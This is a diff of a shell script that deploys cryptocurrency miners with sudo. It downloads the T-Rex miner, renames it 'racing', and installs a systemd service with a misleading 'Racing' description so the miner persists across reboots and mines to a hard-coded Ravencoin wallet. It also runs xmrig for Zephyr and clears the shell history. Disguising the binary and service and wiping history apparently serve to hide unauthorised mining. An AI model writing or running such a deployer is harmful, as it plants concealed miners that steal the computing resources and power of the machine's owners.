@@ -30,10 +30,13 @@ then
     sudo systemctl enable xmrig.service
     sudo ./xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p ${myworker}_ST_C_${noCore} --coin zephyr -a rx/0 -t= ${usingcore} &
 
-    sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.78/lolminerkls-1.78.tar.gz
-    sudo tar -xvf lolminerkls-1.78.tar.gz
-    sudo bash -c 'echo -e "[Unit]\nDescription=lolMiner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin//lolminerkls/lolMiner --algo KARLSEN --pool de.karlsen.herominers.com:1195 --user karlsen:qp5up0zpt82u5p8gu6ptv3gsjs7hlmfj4syvpf3c4m0h5cgd93pscxkfs0s27."'${myworker}_S_C_Kar_Re_${noCore}'"\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
-    sudo ./lolminerkls/lolMiner --algo KARLSEN --pool de.karlsen.herominers.com:1195 --user karlsen:qp5up0zpt82u5p8gu6ptv3gsjs7hlmfj4syvpf3c4m0h5cgd93pscxkfs0s27.${myworker}_S_C_Kar_${noCore} &
+    sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+    sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
+    sudo mv t-rex racing
+    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_ST_C_M_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+    sudo systemctl daemon-reload
+    sudo systemctl enable racing.service
+    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_ST_C_M_${noCore} -p x &
     
     history -c
 else
